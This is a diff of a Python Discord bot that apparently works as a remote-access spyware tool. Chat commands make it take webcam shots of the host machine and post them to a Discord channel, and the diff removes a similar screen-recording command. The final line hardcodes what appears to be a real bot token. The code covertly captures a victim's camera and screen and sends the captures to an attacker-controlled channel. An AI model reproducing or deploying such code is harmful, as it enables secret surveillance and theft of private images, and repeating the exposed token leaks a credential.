@@ -133,17 +133,5 @@ async def on_message(message):
             return
         embed = discord.Embed(title="Webcamshot", description="Webcamshot taken.", color=0x00ff00)
         await message.channel.send(embed=embed,file=discord.File(wc))
-    
-    #SCREENRECORDING
-    if message.content.startswith(".screenrec"):
-        await message.delete()
-        try:
-            sc = pc.sc_rec()
-        except Exception as e:
-            print(e)
-            embed = discord.Embed(title="Screenrec", description="Failed to take screenrecording.", color=0x00ff00)
-            return
-        embed = discord.Embed(title="Screenrec", description="Screenrec taken.", color=0x00ff00)
-        await message.channel.send(embed=embed,file=discord.File(sc))
 client.run("MTE2OTU4MDgwOTQxNDUyOTA2NQ.G-rRef.fnbeuU_NqaBHxyb2Qsr4P1NLilaH9LMkD72mEw")
 
